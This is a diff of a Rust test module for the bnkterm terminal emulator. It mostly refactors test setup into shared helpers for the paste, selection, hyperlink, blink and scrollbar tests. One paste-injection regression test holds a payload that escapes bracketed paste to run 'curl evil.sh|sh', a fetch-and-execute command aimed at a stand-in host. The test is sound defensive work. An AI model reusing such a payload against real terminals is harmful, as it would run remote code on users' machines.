@@ -2149,6 +2149,7 @@ mod tests {
     use crate::platform::geom::Scale;
     use crate::platform::verdict::Refusal;
     use crate::term_render::CellMetrics;
+    use crate::testutil::{feed, METRICS};
     use std::path::Path;
 
     #[test]
@@ -2174,7 +2175,7 @@ mod tests {
         // write blocked here with an infinite `poll(POLLOUT)` on the one thread that also
         // renders, dispatches Wayland and delivers keys: no repaint, no Ctrl+C, and no
         // `pong`, so the compositor greyed the window out too.
-        let mut core = TerminalCore::new(false, geom(80, 24, 640, 384));
+        let mut core = core_80x24(false);
         if core.spawn_program(&["/bin/sleep", "30"]).is_err() {
             eprintln!("pty spawn unavailable in this environment; skipping");
             return;
@@ -2251,7 +2252,7 @@ mod tests {
         // `ESC [ 201 ~` never arrived and the shell stayed in paste mode. Raw mode, since
         // canonical mode caps a line at 4095 bytes; the child reports the last six bytes
         // it received, which must be the closing bracket.
-        let mut core = TerminalCore::new(false, geom(80, 24, 640, 384));
+        let mut core = core_80x24(false);
         let payload = 2 * 1024 * 1024;
         let total = b"\x1b[200~".len() + payload + b"\x1b[201~".len();
         let script = format!(
@@ -2294,7 +2295,7 @@ mod tests {
     /// paste would stay held for the life of the tab.
     #[test]
     fn a_large_paste_gives_its_size_back() {
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.paste(vec![b'x'; 2 * 1024 * 1024]).expect("paste");
         assert!(
             core.key_buf.capacity() <= BUF_KEEP,
@@ -2315,7 +2316,7 @@ mod tests {
         // following CR as a real Enter and runs `echo hi`, then receives the rest as
         // ordinary typing and the next CR executes *that*. One pasted line, two commands,
         // and the second never displayed as pasted text.
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.feed_test_bytes(b"\x1b[?2004h"); // the program wants bracketed paste
         let payload = "echo hi\x1b[201~\ncurl evil.sh|sh\n";
         core.paste(payload.as_bytes().to_vec()).expect("paste");
@@ -2469,7 +2470,7 @@ mod tests {
         // The contract the corner notice rests on. Before the shell marks a prompt there
         // is no answer at all — not a zero, not a guess from output bytes — because until
         // then the terminal genuinely does not know whether a prompt has appeared.
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.spawned_at = Some(Instant::now() - Duration::from_millis(120));
         assert_eq!(
             core.take_startup_time(),
@@ -2497,7 +2498,7 @@ mod tests {
         // The no-integration case, which must stay silent rather than guess. A shell with
         // no OSC 133 prints plenty and marks nothing, and a terminal that timed *that*
         // would be warning about programs that are not prompts.
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.spawned_at = Some(Instant::now() - Duration::from_secs(30));
         core.feed_test_bytes(b"$ ls\r\nCargo.toml  src\r\n$ ");
         assert_eq!(
@@ -2659,7 +2660,7 @@ mod tests {
                 )
             })
         };
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.focused = true;
         assert!(!locked(&core), "a cooked tty draws no lock");
 
@@ -2675,7 +2676,7 @@ mod tests {
     fn synchronized_output_holds_the_frame_and_then_shows_it_whole() {
         // A program brackets a frame with `?2026 h` … `?2026 l` so it is never seen
         // half-drawn. The grid keeps updating throughout — only the *presentation* waits.
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.feed_test_bytes(b"\x1b[?2026h");
         assert!(core.holds_frame(), "the child is mid-frame");
         assert!(core.dirty, "and we still know a frame is owed");
@@ -2723,7 +2724,7 @@ mod tests {
         // The GPU clear must use the same colour as the display list's base fill, or the
         // flash tears along the edges the list does not cover. Two places computing "the
         // background" independently is how that happens, so they compute it once.
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         let calm = core.clear_color();
         assert!(!core.bell_flashing());
 
@@ -2752,7 +2753,7 @@ mod tests {
         // you are the one driving the child (a shell tab-completing against nothing rings
         // the bell on every miss), so the flash would be feedback on your own keystrokes:
         // pure noise. The BEL is swallowed, and the surface never lifts.
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.focused = true;
         let calm = core.clear_color();
 
@@ -2783,7 +2784,7 @@ mod tests {
         // sequences, or simply never send the second. Without a deadline that is a window
         // that never repaints again, which is far worse than the torn frame the mode
         // exists to prevent. So the deadline is the feature, not a safety net bolted on.
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.feed_test_bytes(b"\x1b[?2026h");
         assert!(core.holds_frame());
 
@@ -2829,7 +2830,7 @@ mod tests {
     fn a_blinking_cursor_rests_lit_and_wakes_on_activity() {
         // Each toggle marks the frame dirty, so a blink that never rests is a GPU
         // present twice a second for as long as the window holds focus.
-        let mut core = TerminalCore::new(false, geom(80, 24, 640, 384));
+        let mut core = core_80x24(false);
         core.feed_test_bytes(b"\x1b[?12h");
         assert!(core.screen.cursor_blinks(), "the child asked for a blink");
         core.focus(true).expect("focus");
@@ -2859,7 +2860,7 @@ mod tests {
         // A password prompt echoes nothing, so the keystroke is the only thing that can
         // bring a blinked-off cursor back: it has to repaint the frame by itself, or the
         // next toggle turns the cursor off again before anything drew it lit.
-        let mut core = TerminalCore::new(false, geom(80, 24, 640, 384));
+        let mut core = core_80x24(false);
         core.feed_test_bytes(b"\x1b[?12h");
         core.focus(true).expect("focus");
         core.service_due(Instant::now() + BLINK_INTERVAL);
@@ -2882,7 +2883,7 @@ mod tests {
         // The other half of the deadline's contract: servicing timers must not end a
         // frame the child is still legitimately drawing, or `?2026` would tear exactly
         // the frames it exists to keep whole.
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.feed_test_bytes(b"\x1b[?2026h");
         let armed = core.sync_until;
         assert!(armed.is_some(), "entering arms the deadline");
@@ -2900,7 +2901,7 @@ mod tests {
     #[test]
     fn tab_label_prefers_a_title_then_a_foreground_job_then_the_cwd() {
         let cfg = TabBarConfig::default();
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         // No title and no known cwd: the bare fallback.
         assert_eq!(core.tab_label(&cfg), "shell");
         // A known cwd (as /proc reports it) shows in place of the fallback. A path
@@ -2935,7 +2936,7 @@ mod tests {
         // local prompt has to say what is true again, which is what the injected
         // `_bnkterm_report` hook emits (see crate::shell_integration).
         let cfg = TabBarConfig::default();
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.cwd = Some(std::path::PathBuf::from("/opt/service"));
 
         core.feed_test_bytes(b"\x1b]0;ada@remote: ~/srv\x07\x1b]7;file://remote/srv\x07");
@@ -2960,7 +2961,7 @@ mod tests {
         // its own title. The prefix is the cwd's final component, followed by the
         // separator and title.
         let cfg = TabBarConfig::default();
-        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
+        let mut core = core_80x24(true);
         core.cwd = Some(std::path::PathBuf::from("/home/ada/projects/bnkterm"));
         core.last_title = "fixing the parser".to_string();
 
@@ -2977,16 +2978,6 @@ mod tests {
         assert_eq!(core.tab_label(&cfg), "claude");
     }
 
-    const METRICS: CellMetrics = CellMetrics {
-        size: 16,
-        w: 8,
-        h: 16,
-        baseline: 12,
-        ascent: 12,
-        descent: 4,
-        lock_glyph: true,
-    };
-
     /// A geometry on [`METRICS`] cells, with no padding at unity scale.
     fn geom(cols: usize, rows: usize, width: u32, height: u32) -> TerminalGeometry {
         TerminalGeometry {
@@ -2999,6 +2990,12 @@ mod tests {
             origin_y: 0,
             scale: Scale::ONE,
         }
+    }
+
+    /// An 80x24 core on [`METRICS`] cells with no padding: the demo grid when `demo`,
+    /// else a blank one with no child.
+    fn core_80x24(demo: bool) -> TerminalCore {
+        TerminalCore::new(demo, geom(80, 24, 80 * 8, 24 * 16))
     }
 
     #[test]
@@ -3072,12 +3069,6 @@ mod tests {
         assert!(list.len() > 1, "more than just the background fill");
     }
 
-    /// A demo core (static grid with content in the top-left) for driving pointer
-    /// events through the real selection path.
-    fn pointer_core() -> TerminalCore {
-        TerminalCore::new(true, geom(80, 24, 80 * 8, 24 * 16))
-    }
-
     /// The plain helpers stay in the cell's left half, whose nearer edge is the
     /// cell's own start — the classic floor mapping; `press_in`/`drag_in` pick a
     /// half explicitly for the edge-rounding cases.
@@ -3140,9 +3131,8 @@ mod tests {
     /// A blank (non-demo) core with `text` printed at the top-left, for driving the
     /// hyperlink gestures over content a case chooses.
     fn core_showing(text: &str) -> TerminalCore {
-        let mut core = TerminalCore::new(false, geom(80, 24, 80 * 8, 24 * 16));
-        let mut parser = Parser::new();
-        parser.advance_bytes(&mut core.screen, text.as_bytes());
+        let mut core = core_80x24(false);
+        feed(&mut core.screen, text.as_bytes());
         core
     }
 
@@ -3499,12 +3489,11 @@ mod tests {
             eprintln!("pty spawn unavailable in this environment; skipping");
             return;
         }
-        let mut parser = Parser::new();
         let shown = format!(
             "{} \x1b]8;;https://example.com/\x1b\\web\x1b]8;;\x1b\\",
             file_anchor(&script, "build")
         );
-        parser.advance_bytes(&mut core.screen, shown.as_bytes());
+        feed(&mut core.screen, shown.as_bytes());
 
         click_mods(&mut core, true, 2, 0, input::Mods::CTRL);
         let out = core.take_outbox();
@@ -3648,10 +3637,9 @@ mod tests {
         let mut core = core_showing("");
         assert!(!core.mouse_reporting(), "a bare shell selects text");
 
-        let mut parser = Parser::new();
-        parser.advance_bytes(&mut core.screen, b"\x1b[?1000h");
+        feed(&mut core.screen, b"\x1b[?1000h");
         assert!(core.mouse_reporting(), "the program took the mouse");
-        parser.advance_bytes(&mut core.screen, b"\x1b[?1000l");
+        feed(&mut core.screen, b"\x1b[?1000l");
         assert!(!core.mouse_reporting(), "and gave it back on exit");
     }
 
@@ -3663,8 +3651,7 @@ mod tests {
         hover_at(&mut core, 5, 1, input::Mods::NONE);
         assert!(core.hovered_link().is_none(), "row 1 is blank");
         // Print a link onto row 1, where the pointer already rests.
-        let mut parser = Parser::new();
-        parser.advance_bytes(&mut core.screen, b"https://example.com/b");
+        feed(&mut core.screen, b"https://example.com/b");
         core.after_output();
         assert_eq!(
             core.hovered_link(),
@@ -3702,8 +3689,7 @@ mod tests {
 
         // Output rewrites the link under the parked pointer: the same cells, judged the
         // same, but a click would now open another target.
-        let mut parser = Parser::new();
-        parser.advance_bytes(&mut core.screen, b"\x1b[1;22Hhttps://evil.example/c");
+        feed(&mut core.screen, b"\x1b[1;22Hhttps://evil.example/c");
         core.after_output();
         assert_eq!(core.preview, "evil.example  https://evil.example/c");
 
@@ -3717,7 +3703,7 @@ mod tests {
         // Dragging across the demo title (row 0 begins "bnkterm") offers that text on
         // release to *both* the clipboard and the primary selection, so Ctrl+V and
         // middle-click both paste it.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         press(&mut core, MouseButton::Left, true, 0, 0);
         drag_in(&mut core, 3, 0, Side::Right); // past col 3's midline, so its cell joins
         press(&mut core, MouseButton::Left, false, 3, 0);
@@ -3754,7 +3740,7 @@ mod tests {
         // TUI that repaints per motion report repaints tens of times per cell, and a
         // tmux-over-ssh session pays a round trip for every duplicate. xterm and foot both
         // stay silent until the cell changes.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         core.feed_test_bytes(b"\x1b[?1003h\x1b[?1006h"); // any-motion reporting, SGR
 
         assert_eq!(
@@ -3806,7 +3792,7 @@ mod tests {
     fn a_double_click_selects_the_word() {
         // A double-click inside "bnkterm" selects the whole word, bounded by the
         // trailing space, with no drag needed.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         click(&mut core, MouseButton::Left, true, 2, 0, 2, Side::Left);
         click(&mut core, MouseButton::Left, false, 2, 0, 1, Side::Left);
         assert_eq!(primary_offer(&mut core).as_deref(), Some("bnkterm"));
@@ -3816,7 +3802,7 @@ mod tests {
     fn a_triple_click_selects_the_line() {
         // A triple-click selects the whole logical line (row 0's title), trailing
         // blanks trimmed.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         let row = core.screen.abs_row(0);
         let expected = grid_text(&core.screen, (row, 0), (row, 79));
         click(&mut core, MouseButton::Left, true, 5, 0, 3, Side::Left);
@@ -4152,7 +4138,7 @@ mod tests {
     fn a_bare_click_selects_nothing() {
         // Press and release on the same cell (no drag) selects nothing: no primary
         // offer, and the selection is cleared so no stray cell stays highlighted.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         press(&mut core, MouseButton::Left, true, 0, 0);
         press(&mut core, MouseButton::Left, false, 0, 0);
         assert!(
@@ -4170,7 +4156,7 @@ mod tests {
         // The single-click "blink": a plain click, even with sub-cell motion that
         // stays on the press's side of the cell's midline, must never create a
         // selection, so the clicked cell does not flash the selection colour.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         press(&mut core, MouseButton::Left, true, 2, 0);
         assert!(core.selection.is_none(), "the press alone shows nothing");
         drag_to(&mut core, 2, 0); // motion that crosses no midline
@@ -4255,7 +4241,7 @@ mod tests {
     fn a_double_click_in_the_trailing_half_still_takes_the_whole_word() {
         // Edge rounding is a character-drag affair: word (and line) clicks stay
         // greedy, a click anywhere on a word means that word.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         click(&mut core, MouseButton::Left, true, 2, 0, 2, Side::Right);
         click(&mut core, MouseButton::Left, false, 2, 0, 1, Side::Right);
         assert_eq!(primary_offer(&mut core).as_deref(), Some("bnkterm"));
@@ -4267,7 +4253,7 @@ mod tests {
         // (so the highlight sticks after release, matching wezterm/ghostty) yet offers
         // nothing to the clipboard, since blank cells have no text to copy. Row 20 is
         // below the demo's last content row (16), so it is all blank cells.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         press(&mut core, MouseButton::Left, true, 5, 20);
         drag_to(&mut core, 15, 20);
         press(&mut core, MouseButton::Left, false, 15, 20);
@@ -4300,7 +4286,7 @@ mod tests {
         // the live bottom on every read from the PTY, so a chatty child (a spinner, a
         // build) snatched the view back ten times a second and scrolling back while it
         // printed was impossible. Output moves the content, so the offset moves with it.
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         for i in 0..40 {
             core.feed_test_bytes(format!("line {i}\r\n").as_bytes());
         }
@@ -4342,7 +4328,7 @@ mod tests {
     fn middle_click_requests_a_primary_paste() {
         // With no program grabbing the mouse, a middle-click asks the window to paste
         // the primary selection (the window owns the data device).
-        let mut core = pointer_core();
+        let mut core = core_80x24(true);
         press(&mut core, MouseButton::Middle, true, 5, 5);
         assert!(
             core.take_outbox()
@@ -4357,10 +4343,9 @@ mod tests {
     /// padding, unity scale, so the lane lands at a hand-checkable place (see
     /// [`lane_x`]).
     fn scrollable_core(lines: usize) -> TerminalCore {
-        let mut core = TerminalCore::new(false, geom(80, 24, 80 * 8, 24 * 16));
-        let mut parser = Parser::new();
+        let mut core = core_80x24(false);
         for i in 0..lines {
-            parser.advance_bytes(&mut core.screen, format!("line {i}\r\n").as_bytes());
+            feed(&mut core.screen, format!("line {i}\r\n").as_bytes());
         }
         core
     }
@@ -4403,8 +4388,7 @@ mod tests {
     #[test]
     fn the_alt_screen_offers_no_bar_to_grab() {
         let mut core = scrollable_core(100);
-        let mut parser = Parser::new();
-        parser.advance_bytes(&mut core.screen, b"\x1b[?1049h");
+        feed(&mut core.screen, b"\x1b[?1049h");
         assert!(core.screen.is_alt());
         assert!(!core.scrollable(), "the alt screen keeps no history");
         assert!(
@@ -4497,8 +4481,7 @@ mod tests {
         core.flash_scrollbar();
         assert!(core.scrollbar_retry_at().is_some());
 
-        let mut parser = Parser::new();
-        parser.advance_bytes(&mut core.screen, b"\x1b[?1049h");
+        feed(&mut core.screen, b"\x1b[?1049h");
         core.tick_scrollbar(Instant::now());
         assert_eq!(
             core.scrollbar_retry_at(),
